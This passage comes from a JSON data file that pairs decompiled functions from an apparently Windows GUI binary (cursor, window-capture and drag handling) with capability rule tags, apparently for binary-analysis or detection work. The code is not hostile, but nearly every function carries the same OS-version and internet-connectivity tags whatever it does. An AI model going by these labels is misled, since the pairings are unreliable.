        "decompiled_code": "\nuint64_t fcn.0044a2e8(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack20;\n    \n    uStack20 = uStack20 & 0xffffff00;\n    cVar2 = fcn.00437cd0();\n    if (cVar2 == '\\0') {\n        fcn.0043bbc0();\n        iVar4 = fcn.00433a24();\n        if ((iVar4 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n            iVar7 = 0;\n            do {\n                piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n                cVar2 = fcn.004047dc();\n                if (cVar2 != '\\0') {\n                    if (iVar4 == *(piVar1 + 0x21)) {\ncode_r0x0044a36f:\n                        uVar3 = (**(*piVar1 + 0x50))();\n                        uStack20 = uStack20 | uVar3;\n                        break;\n                    }\n                    if (piVar1[0x24] != 0) {\n                        fcn.0044abb8();\n                        iVar5 = fcn.0044ac18();\n                        if (iVar5 != -1) goto code_r0x0044a36f;\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n    }\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 421
    },
    "0044a71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a71c(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x44a814;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.00404800();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.0044a1b4(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.0044a1a0();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004047dc(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.0044a71c();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 539
    },
    "0044abb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044abb8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 87
    },
    "0045acb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045acb0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.0045c858();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0044d2c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d2c0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0044d264();\n    if ((iVar1 == 0) && (*0x497c62 != 0)) {\n        (**0x497c60)();\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0044d5b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0044d5b0(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.0044d264();\n    if (((iVar1 != 0) && (*0x490710 != 0)) && (iVar1 == *(*0x490710 + 0x30))) {\n        iVar1 = *0x490710;\n    }\n    return iVar1;\n}\n",
        "token_count": 98
    },
    "0044d5d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d5d8(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x490710 = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004047dc(),  iVar1 = *0x490710,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x490710 = iVar1;\n        uVar3 = fcn.00458568();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0044d8a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044d8a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x44d99f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea0c();\n        }\n        else if (iVar1 == 0x200) {\n            var_10h._0_2_ = param_2[2];\n            var_ch = var_10h;\n            var_10h._2_2_ = param_2[2] >> 0x10;\n            var_8h = var_10h._2_2_;\n            in_stack_ffffffc4 = *0x497c8c;\n            puStack44 = &stack0xfffffffc;\n            sub.user32.dll_ClientToScreen(*0x497c8c, &var_ch);\n            fcn.0044e37c();\n        }\n        else if (iVar1 == 0x202) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea0c();\n        }\n        else if (iVar1 == 0x205) {\n            if (*(in_EAX + 0x38) == '\\0') {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044ea0c();\n            }\n            else {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044ea0c();\n            }\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0044e37c();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea0c();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack44 = &stack0xfffffffc;\n        fcn.0044e37c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    return;\n}\n",
        "token_count": 650
    },
    "0044dadc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044dadc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.0040484c();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 74
    },
    "0044db78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044db78(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0044da68();\n    *(in_EAX + 0x38) = 1;\n    uVar1 = fcn.00424d90();\n    *(in_EAX + 0x48) = uVar1;\n    fcn.0042b888();\n    fcn.00424f0c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 225
    },
    "0044dd70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044dd70(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "0044dddc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0044dddc(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.0044e224();\n    iVar2 = sub.user32.dll_GetWindow(hWnd, 4);\n    if (iVar2 != *(**0x4925c4 + 0x30)) {\n        iVar2 = fcn.0044d264();\n        if (iVar2 == 0) {\n            return var_1h;\n        }\n        do {\n            iVar2 = *(iVar2 + 0x30);\n        } while (iVar2 != 0);\n        hWnd = fcn.00458568();\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        var_18h = fcn.00458568();\n        if (var_18h != hWnd) {\n            iVar2 = *(*(arg_8h + -0x10) + 0x30);\n            if (iVar2 == 0) {\n                cVar1 = fcn.004047dc();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.00458568();\n                }\n            }\n            else {\n                do {\n                    iVar2 = *(iVar2 + 0x30);\n                } while (iVar2 != 0);\n                var_1ch = fcn.00458568();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0044dd70, &var_1ch);\n            sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.0040484c(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004047dc();\n                if ((((cVar1 == '\\0') || (*(*(*0x497c84 + 0x40) + 0x94) == 0)) ||\n                    (iVar2 = fcn.00458568(),  iVar2 != hWnd)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  iVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 735
    },
    "0044dfbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0044dfbc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x497ca8 != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x4925c4 + 0xbc)) {\n            (**(**0x497cac + 8))();\n            iVar4 = *(*0x497ca8 + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.00419888();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1da) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.00458568();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.0044df78(&var_1h + 1),  cVar1 == '\\0')) &&\n                           (cVar1 = fcn.0040484c(),  cVar1 != '\\0')) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.0040484c();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.0044d6e8();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x497cac)[2]) {\n                var_18h = fcn.0044d7a0(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.0044dddc(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 682
    },
    "0044e110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e110(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x497ca8 == 0) {\n            *0x497ca8 = fcn.00404620();\n        }\n        iVar1 = fcn.004198e4();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.0041977c();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.00419730();\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0044e2dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044e2dc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x497c84 + 8);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1db) != '\\0')) && (*(iVar1 + 0x1ac) != 0)) &&\n       (iVar2 = fcn.00456f1c(),  iVar2 != 0)) {\n        iVar2 = fcn.00456f1c();\n        if ((iVar2 == 1) && (iVar2 = fcn.00419888(),  iVar2 == *(*0x497c84 + 0x40))) {\n            return 0;\n        }\n        iVar2 = fcn.0044ed7c();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.004198e4();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.00456f30();\n    }\n    return var_4h;\n}\n",
        "token_count": 300
    },
    "0044e37c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e37c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x497ca0 == '\\0') &&\n        (uVar9 = *0x497c90 - *in_EAX >> 0x1f,  (*0x497c90 - *in_EAX ^ uVar9) - uVar9 < *0x497c9c)) &&\n       (uVar9 = *0x497c94 - in_EAX[1] >> 0x1f,  (*0x497c94 - in_EAX[1] ^ uVar9) - uVar9 < *0x497c9c)) {\n        return;\n    }\n    iVar10 = 0x44e3d7;\n    iVar7 = fcn.0044e250(*0x497c80);\n    if ((*0x497ca0 == '\\0') && (*0x497ca4 != 0)) {\n        iVar10 = *0x497c94;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0045a0f0(iVar10);\n    }\n    if (*(*0x497c80 + 0x8f) == '\\0') {\n        *0x497ca0 = '\\x01';\n    }\n    else {\n        *0x497ca0 = '\\x02';\n    }\n    if (iVar7 != (*0x497c84)[2]) {\n        fcn.0044e2a0();\n        if (*0x497c84 == NULL) {\n            return;\n        }\n        (*0x497c84)[2] = iVar7;\n        (*0x497c84)[3] = iVar10;\n        piVar1 = *0x497c84;\n        (*0x497c84)[4] = *in_EAX;\n        piVar1[5] = in_EAX[1];\n        fcn.0044e2a0();\n        if (*0x497c84 == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x497c84;\n    (*0x497c84)[4] = *in_EAX;\n    piVar1[5] = in_EAX[1];\n    if ((*0x497c84)[2] != 0) {\n        fcn.00450344();\n        piVar1 = *0x497c84;\n        (*0x497c84)[6] = iStack28;\n        piVar1[7] = iStack24;\n    }\n    fcn.0044e2a0(in_EAX[1]);\n    (**(**0x497c84 + 4))();\n    if (*0x497ca4 != 0) {\n        if (((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) || (*(*0x497c84 + 1) != '\\0')) {\n            fcn.0045a0cc();\n            if (*(*0x497ca4 + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.0045a0f0(iVar10);\n            }\n            else {\n                fcn.0045a1ec();\n            }\n        }\n        else {\n            fcn.0045a260();\n            uVar8 = fcn.004441f0();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.004441f0();\n    sub.user32.dll_SetCursor();\n    if (*0x497ca0 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.0040484c(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0044e2dc();\n            (*0x497c84)[0x18] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.0040484c();\n                *(*0x497c84 + 0x17) = uVar5;\n            }\n            else {\n                fcn.00450344();\n                uVar5 = fcn.0040484c();\n                *(*0x497c84 + 0x17) = uVar5;\n            }\n        }\n        if ((*0x497c84 != NULL) && (cVar6 = fcn.00409944(),  cVar6 == '\\0')) {\n            if ((cVar4 != '\\0') && (cVar4 = (**(**0x497c84 + 0x3c))(),  cVar4 != '\\0')) {\n                (**(**0x497c84 + 0x34))();\n            }\n            (**(**0x497c84 + 0x30))();\n            piVar3 = *0x497c84;\n            piVar2 = *0x497c84 + 0x1a;\n            piVar1 = *0x497c84 + 0x14;\n            (*0x497c84)[0x19] = (*0x497c84)[0x13];\n            *piVar2 = *piVar1;\n            piVar3[0x1b] = piVar3[0x15];\n            piVar3[0x1c] = piVar3[0x16];\n        }\n    }\n    return;\n}\n",
        "token_count": 1266
    },
    "0044e664": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e664(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x497c84 = in_EAX;\n    in_EAX[2] = 0;\n    sub.user32.dll_GetCursorPos(0x497c90);\n    piVar1 = *0x497c84;\n    (*0x497c84)[4] = *0x497c90;\n    piVar1[5] = *0x497c94;\n    *0x497c98 = sub.user32.dll_GetCursor();\n    *0x497c8c = fcn.0044d844();\n    *0x497c9c = param_1;\n    cVar2 = fcn.004047dc();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x497ca0 = '\\0';\n        }\n        else {\n            *0x497ca0 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x13];\n        if (in_EAX[0x15] == iVar3 || in_EAX[0x15] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x15] - in_EAX[0x13]);\n        }\n        iVar3 = in_EAX[0x14];\n        if (in_EAX[0x16] == iVar3 || in_EAX[0x16] - iVar3 < 0) {\n            in_EAX[0xc] = 0;\n            in_EAX[0xd] = 0;\n        }\n        else {\n            *(in_EAX + 0xc) = (in_EAX[5] - iVar3) / (in_EAX[0x16] - in_EAX[0x14]);\n        }\n        if (param_2 == '\\0') {\n            *0x497ca0 = '\\0';\n        }\n        else {\n            *0x497ca0 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x497ca4 = (**(**0x497c84 + 8))();\n    if (*0x497ca4 != 0) {\n        iVar3 = *0x497c94;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0045a0f0(iVar3);\n    }\n    *0x497cac = fcn.00404620();\n    if (*0x497ca0 != '\\0') {\n        fcn.0044e37c();\n    }\n    return;\n}\n",
        "token_count": 647
    },
    "0044e7d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e7d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x44e979;\n    iStack60 = *in_FS_OFFSET;\n    *0x497c80 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x497c88 = 0;\n    if (*(in_EAX + 0x8f) == '\\0') {\n        puStack64 = 0x44e81b;\n        puStack52 = &stack0xfffffffc;\n        fcn.0040484c();\n        if (*0x497c80 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x44e849;\n            var_8h = fcn.0044da68();\n            *0x497c88 = 1;\n        }\n    }\n    else {\n        fcn.0040484c();\n        if (*0x497c80 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.0044db78();\n            *0x497c88 = 1;\n        }\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x40) + 0x30) == 0) && (cVar1 = fcn.004047dc(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0044e7d4::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x4c) = lpPoint;\n                *(var_8h + 0x50) = var_ch;\n            }\n            else {\n                fcn.00418410();\n                puStack64 = 0x44e91a;\n                fcn.00450294();\n                *(var_8h + 0x4c) = var_18h;\n                *(var_8h + 0x50) = var_14h;\n            }\n            fcn.00418410();\n            *(var_8h + 0x54) = var_18h;\n            *(var_8h + 0x58) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x4c;\n            uVar2 = fcn.00458568();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n        *(var_8h + 0x6c) = *(var_8h + 0x54);\n        *(var_8h + 0x70) = *(var_8h + 0x58);\n    }\n    fcn.0044e664();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 822
    },
    "0044e998": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044e998(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x497c84 + 8) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x497ca0 == '\\x02')) {\n        cVar1 = (**(**0x497c80 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x497c80)[0x25] != 0)) {\n            if ((*0x497c80)[0x25] != 0) {\n                uVar2 = fcn.0040484c();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 224
    },
    "0044ea0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
